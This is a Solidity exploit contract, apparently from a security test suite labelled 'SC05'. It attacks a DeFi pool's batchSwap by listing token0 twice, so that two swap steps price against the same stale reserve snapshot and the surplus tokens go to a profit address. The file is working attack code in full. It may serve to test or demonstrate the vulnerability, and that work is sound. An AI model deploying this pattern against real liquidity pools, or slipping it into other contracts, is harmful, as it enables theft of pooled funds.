// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { KestrelPool } from "kestrel/KestrelPool.sol";

/// @notice SC05 attacker: lists token0 twice in a {KestrelPool.batchSwap} so two steps price
///         against the same stale reserve snapshot.
contract DuplicateBatchAttacker {
    /// @notice Target pool.
    KestrelPool public immutable pool;

    /// @param _pool Target pool.
    constructor(KestrelPool _pool) {
        pool = _pool;
    }

    /// @notice Sell `y` token1 for token0 twice in one batch with token0 duplicated.
    /// @param y token1 sold per step (this contract must hold `2 * y`).
    /// @param to Profit recipient.
    /// @return received token0 received.
    function attack(uint256 y, address to) external returns (uint256 received) {
        IERC20 t0 = pool.token0();
        IERC20 t1 = pool.token1();
        t1.approve(address(pool), 2 * y);
        address[] memory assets = new address[](3);
        assets[0] = address(t0);
        assets[1] = address(t1);
        assets[2] = address(t0);
        KestrelPool.BatchStep[] memory steps = new KestrelPool.BatchStep[](2);
        steps[0] = KestrelPool.BatchStep({ assetInIndex: 1, assetOutIndex: 0, amountIn: y });
        steps[1] = KestrelPool.BatchStep({ assetInIndex: 1, assetOutIndex: 2, amountIn: y });
        pool.batchSwap(assets, steps, address(this));
        received = t0.balanceOf(address(this));
        t0.transfer(to, received);
    }
}
